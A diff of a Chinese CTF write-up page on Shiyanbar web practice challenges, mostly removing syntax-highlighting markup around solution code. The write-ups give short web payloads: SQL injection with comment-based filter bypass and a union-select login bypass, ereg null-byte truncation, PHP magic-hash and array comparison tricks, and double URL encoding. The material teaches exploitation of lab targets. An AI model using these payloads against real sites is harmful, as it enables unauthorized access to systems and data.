 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_9"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_9" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_9"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x7B80;&#x5355;Fuzz&#x53D1;&#x73B0;&#x8FC7;&#x6EE4;&#x4E86;&#x7A7A;&#x683C;&#xFF0C;&#x4F7F;&#x7528;&#x5185;&#x655B;&#x6CE8;&#x91CA;&#x4E00;&#x628A;&#x55E6;&#x3002; </p>
-<pre class="language-"><code>/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database()
+<pre><code>/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database()
 </code></pre><h3 id="0x0b-&#x7B80;&#x5355;&#x7684;sql&#x6CE8;&#x5165;&#x4E4B;1"><a name="0x0b-&#x7B80;&#x5355;&#x7684;sql&#x6CE8;&#x5165;&#x4E4B;1" class="anchor-navigation-ex-anchor" href="#0x0b-&#x7B80;&#x5355;&#x7684;sql&#x6CE8;&#x5165;&#x4E4B;1"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.11. 0x0B &#x7B80;&#x5355;&#x7684;sql&#x6CE8;&#x5165;&#x4E4B;1</h3>
 <h4 id="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_10"><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_10" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_10"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;" class="plugin-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;</h4>
 <ul>
@@ -881,7 +894,7 @@ mysql_close($con);
 <li>WP&#xFF1A;<a href="https://www.jianshu.com/p/5d37d33854e3" target="_blank">https://www.jianshu.com/p/5d37d33854e3</a>  </li>
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;</h4>
-<pre class="language-"><code>selectselect
+<pre><code>selectselect
 </code></pre><h3 id="0x0c-&#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;"><a name="0x0c-&#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;" class="anchor-navigation-ex-anchor" href="#0x0c-&#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.12. 0x0C &#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;</h3>
 <h4 id="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_11"><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_11" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_11"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;" class="plugin-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;</h4>
 <ul>
@@ -890,7 +903,7 @@ mysql_close($con);
 <li>WP&#xFF1A;&#x65E0;</li>
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_10"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_10" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_10"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
-<pre class="language-"><code>import requests,base64
+<pre><code>import requests,base64
 r = requests.get(&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos;)
 key=base64.b64decode(r.headers[&apos;FLAG&apos;])[-9:]
 r = requests.post(&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos;,data={&apos;key&apos;:key})
@@ -910,7 +923,7 @@ print(r.text)
 <li>WP&#xFF1A;&#x65E0;</li>
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_11"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_11" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_11"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
-<pre class="language-"><code>index.php/index.php
+<pre><code>index.php/index.php
 </code></pre><h3 id="0x0f-forms"><a name="0x0f-forms" class="anchor-navigation-ex-anchor" href="#0x0f-forms"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.15. 0X0F Forms</h3>
 <h4 id="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_14"><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_14" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_14"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;" class="plugin-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;</h4>
 <ul>
@@ -929,7 +942,7 @@ print(r.text)
 <p>&#x53F3;&#x952E;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#x90E8;&#x5206;&#x6E90;&#x7801; &#xFF1A;<br>     <a href="https://i.loli.net/2019/04/09/5caca4c359172.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/09/5caca4c359172.png" alt="">
      </a><br>&#x6211;&#x4EEC;&#x77E5;&#x9053;0e&#x5F00;&#x5934;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5728;&#x4E0E;&#x6570;&#x5B57;0&#x505A;&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;&#x65F6;&#x4F1A;&#x5148;&#x8F6C;&#x6210;&#x6570;&#x503C;0&#x5728;&#x6BD4;&#x8F83;&#xFF0C;&#x6545;&#xFF1A;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x7ECF;md5&#x52A0;&#x5BC6;&#x540E;&#x5BC6;&#x6587;&#x4E3A;0e&#x5F00;&#x5934;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5373;&#x53EF;&#x3002;  </p>
-<pre class="language-"><code>s878926199a
+<pre><code>s878926199a
 0e545993274517709034328855841020
 s155964671a
 0e342768416822451524974117254469
@@ -1011,7 +1024,7 @@ s878926199a
      <a href="https://i.loli.net/2019/04/09/5cacae6dda29d.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/09/5cacae6dda29d.png" alt="">
      </a>  </p>
-<pre class="language-"><code>........&#x8FD9;&#x4E00;&#x884C;&#x662F;&#x7701;&#x7565;&#x7684;&#x4EE3;&#x7801;........
+<pre><code>........&#x8FD9;&#x4E00;&#x884C;&#x662F;&#x7701;&#x7565;&#x7684;&#x4EE3;&#x7801;........
 
 /*
 &#x5982;&#x679C;&#x767B;&#x5F55;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x4E0D;&#x662F;&#x7BA1;&#x7406;&#x5458;&#x5219; die()
@@ -1065,7 +1078,7 @@ if(!empty($token)&amp;&amp;!empty($emailAddress)){
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_14"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_14" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_14"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#xFF0C;&#x5F97;&#x5230;&#x9898;&#x76EE;&#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 if (isset ($_GET[&apos;password&apos;])) {
     if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)
     {
@@ -1087,7 +1100,7 @@ if (isset ($_GET[&apos;password&apos;])) {
         echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;
     }
 }
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x9996;&#x5148;&#x5224;&#x65AD;&#x662F;&#x5426;&#x7528;&#x8FC7;get&#x65B9;&#x5F0F;&#x4F20;&#x5165;password&#xFF0C;&#x5176;&#x6B21;&#x5224;&#x65AD;&#x662F;&#x5426;&#x53EA;&#x542B;&#x6709;&#x6570;&#x5B57;&#x548C;&#x5B57;&#x6BCD;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5219;&#x8FD4;&#x56DE;&#x9519;&#x8BEF;&#xFF0C;&#x63A5;&#x7740;&#x5224;&#x65AD;&#x957F;&#x5EA6;&#x5C0F;&#x4E8E;8&#x4E14;&#x5927;&#x4E8E;9999999&#x3002;&#x770B;&#x5230;&#x8FD9;&#x91CC;&#x4F30;&#x8BA1;&#x5C31;&#x77E5;&#x9053;&#x662F;&#x8981;&#x8003;&#x79D1;&#x5B66;&#x8BA1;&#x6570;&#x6CD5;&#x4E86;&#xFF0C;&#x6700;&#x540E;&#x8981;&#x6C42;get&#x7684;&#x6570;&#x636E;&#x5305;&#x542B;<code>*-*</code>&#x3002;<br>&#x6211;&#x4EEC;&#x77E5;&#x9053;1E8&#x5C31;&#x7B49;&#x4E8E;10000000&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x957F;&#x5EA6;&#x5C0F;&#x4E8E;8&#x4E14;&#x5927;&#x4E8E;9999999&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x4E0D;&#x8FC7;&#x6211;&#x4EEC;&#x5148;&#x5F97;&#x7ED5;&#x5F00;&#x5224;&#x65AD;&#x53EA;&#x6709;&#x6570;&#x5B57;&#x548C;&#x5B57;&#x6BCD;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x77E5;&#x9053;ereg&#x51FD;&#x6570;&#x53EF;&#x5229;&#x7528;%00&#x8FDB;&#x884C;&#x622A;&#x65AD;&#x653B;&#x51FB;&#xFF0C;&#x6545;&#x6211;&#x4EEC;&#x7684;payload&#x6784;&#x9020;&#x5982;&#x4E0B;&#xFF1A;<br><code>?password=1e8%00*-*</code><br>&#x6CE8;&#x610F;&#x6B64;&#x5904;&#x7684;%00&#x53EA;&#x5360;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x5927;&#x5C0F;&#x3002;<br>     <a href="https://i.loli.net/2019/04/11/5caf5ee4d7fef.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/11/5caf5ee4d7fef.png" alt="">
      </a>  </p>
@@ -1100,7 +1113,7 @@ if (isset ($_GET[&apos;password&apos;])) {
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_15"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_15" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_15"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#x5F97;&#x5230;&#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 session_start(); 
 if (isset ($_GET[&apos;password&apos;])) {
     if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;])
@@ -1110,7 +1123,7 @@ if (isset ($_GET[&apos;password&apos;])) {
 }
 
 mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x521B;&#x5EFA;session&#xFF0C;&#x901A;&#x8FC7;get&#x65B9;&#x5F0F;&#x53D6;password&#x503C;&#x518D;&#x4E0E;session&#x91CC;&#x7684;password&#x503C;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4E0D;&#x77E5;&#x9053; session&#x91CC;&#x7684;password&#x503C;&#x662F;&#x591A;&#x5C11;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x63A7;&#x5236;session&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD9;&#x91CC;&#x7684;&#x6BD4;&#x8F83;&#x662F;&#x7528;==&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;&#xFF0C;&#x731C;&#x60F3;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5C06;cookie&#x5220;&#x9664;&#xFF0C;&#x90A3;&#x4E48;$_SESSION[&apos;password&apos;]&#x7684;&#x503C;&#x5C06;&#x4E3A;NULL&#xFF0C;&#x6B64;&#x65F6;&#x5982;&#x679C;&#x6211;&#x4EEC;get&#x4F20;&#x5165;&#x7684; password&#x4E3A;&#x7A7A;&#xFF0C;&#x5373;&apos;&apos;&#xFF0C;&#x90A3;&#x4E48;&#x6BD4;&#x8F83;&#x7ED3;&#x679C;&#x5373;&#x4E3A;true&#x3002;<br>payload:<br><code>&#x5C06;cookie&#x5220;&#x9664;&#x6216;&#x7981;&#x7528;&#xFF0C;&#x63A5;&#x7740;&#x8BBF;&#x95EE;?password=</code>
      <a href="https://i.loli.net/2019/04/11/5caf5ee4d9f11.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/11/5caf5ee4d9f11.png" alt="">
@@ -1124,7 +1137,7 @@ mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_16"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_16" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_16"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#x83B7;&#x5F97;&#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) {
     if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])
         echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;;
@@ -1135,7 +1148,7 @@ if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) {
 }
 else{
     echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x6211;&#x4EEC;&#x77E5;&#x9053;sha1()&#x51FD;&#x6570;&#x4E0E;md5()&#x7C7B;&#x4F3C;&#xFF0C;&#x5F53;&#x53C2;&#x6570;&#x4E3A;&#x6570;&#x7EC4;&#x65F6;&#x4F1A;&#x8FD4;&#x56DE;NULL&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;name&#x4E0E;password&#x4E3A;&#x6570;&#x7EC4;&#x65F6;&#x65E0;&#x8BBA;&#x5176;&#x4E3A;&#x4EC0;&#x4E48;&#x503C;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>sha1($name)===sha1($password)</code>&#x7684;&#x5F3A;&#x7C7B;&#x578B;&#x5224;&#x65AD;&#x3002;<br>&#x6545;&#x6211;&#x4EEC;&#x7684;payload&#x6784;&#x9020;&#x5982;&#x4E0B;&#xFF1A;<br><code>?name[]=a&amp;password[]=b</code>
      <a href="https://i.loli.net/2019/04/11/5caf5ee4db525.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/11/5caf5ee4db525.png" alt="">
@@ -1158,7 +1171,7 @@ else{
 <ul>
 <li>&#x8003;&#x70B9;&#xFF1A;&#x9006;&#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;  </li>
 <li>&#x96BE;&#x5EA6;&#xFF1A;&#x6613;  </li>
-<li>WP&#xFF1A;<pre class="language-"><code>&#x90E8;&#x5206;&#xFF1A;
+<li>WP&#xFF1A;<pre><code>&#x90E8;&#x5206;&#xFF1A;
 x = &quot;~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg&quot;
 c = &quot;&quot;
 for a in x:
@@ -1180,12 +1193,12 @@ print(c)
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_19"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_19" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_19"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#xFF0C;&#x53F3;&#x952E;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;&#x5F97;&#x5230;&#x9898;&#x76EE;&#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
 welcome to simplexue
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
-<span class="token prolog">&lt;?php
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
 if($_POST[user] &amp;&amp; $_POST[pass]) {
     $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);
     mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);
@@ -1212,15 +1225,15 @@ else {
 
   }
 }
-?&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>post</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>index.php</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>text</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>user</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>Username<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>password</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>pass</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>Password<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>index.txt<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+?&gt;
+&lt;form method=post action=index.php&gt;
+&lt;input type=text name=user value=&quot;Username&quot;&gt;
+&lt;input type=password name=pass value=&quot;Password&quot;&gt;
+&lt;input type=submit&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;a href=&quot;index.txt&quot;&gt;
+&lt;/html&gt;
 </code></pre><p>strcasecmp()&#x51FD;&#x6570;&#x4E0D;&#x5206;&#x5927;&#x5C0F;&#x5199;&#x8FDB;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x6BD4;&#x8F83;&#x3002;<br>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x4E0D;&#x77E5;&#x9053;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x5DF2;&#x6709;&#x7684;&#x7528;&#x6237;&#x503C;&#x4E3A;&#x591A;&#x5C11;&#xFF0C;&#x66F4;&#x4E0D;&#x77E5;&#x5176;&#x5BC6;&#x7801;&#x3002;<br>&#x4E0D;&#x8FC7;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x6CE8;&#x5165;&#x6765;&#x8FD4;&#x56DE;&#x6211;&#x4EEC;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x3002;<br>payloadd:
 <code>user=abc&apos; union select &apos;c4ca4238a0b923820dcc509a6f75849b&amp;pass=1</code><br>1&#x7684;md5&#x4E3A;&#xFF1A;c4ca4238a0b923820dcc509a6f75849b<br>     <a href="https://i.loli.net/2019/04/11/5caf6479b0889.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/11/5caf6479b0889.png" alt="">
@@ -1245,7 +1258,7 @@ else {
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_21"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_21" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_21"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#xFF0C;&#x9875;&#x9762;&#x63D0;&#x793A;&#xFF1A;index.php.txt&#xFF0C;&#x6253;&#x5F00;&#x5F97;&#x5230;&#x6E90;&#x7801;&#xFF1A;  </p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
   echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
   exit();
@@ -1257,8 +1270,8 @@ if($_GET[id] == &quot;hackerDJ&quot;)
   echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
   echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;
 }
-?&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
+?&gt;
+&lt;br&gt;&lt;br&gt;
 Can you authenticate to this website?
 </code></pre><p><code>$_GET[id]</code>&#x5728;&#x53D6;&#x5230;&#x503C;&#x540E;&#x5DF2;&#x7ECF;&#x81EA;&#x52A8;urldecode&#x4E86;&#x4E00;&#x6B21;&#xFF0C;&#x7136;&#x800C;&#x540E;&#x8FB9;&#x518D;&#x7528;urldecode&#x89E3;&#x7801;&#x4E00;&#x6B21;&#xFF0C;&#x6545;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E8C;&#x6B21;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#x524D;&#x8FB9;&#x7684;&#x5173;&#x952E;&#x5B57;&#x68C0;&#x6D4B;&#x3002;<br>     <a href="https://i.loli.net/2019/04/12/5caf66674a8d7.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/12/5caf66674a8d7.png" alt="">
@@ -1361,7 +1374,7 @@ Can you authenticate to this website?
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"实验吧web部分","level":"1.5.5","depth":2,"next":{"title":"加入我们完善网站!","level":"1.6","depth":1,"path":"help.md","ref":"help.md","articles":[]},"previous":{"title":"2019西湖论剑预选赛","level":"1.5.4","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","-highlight","prism","sitemap","analytics","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism.css"]},"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa 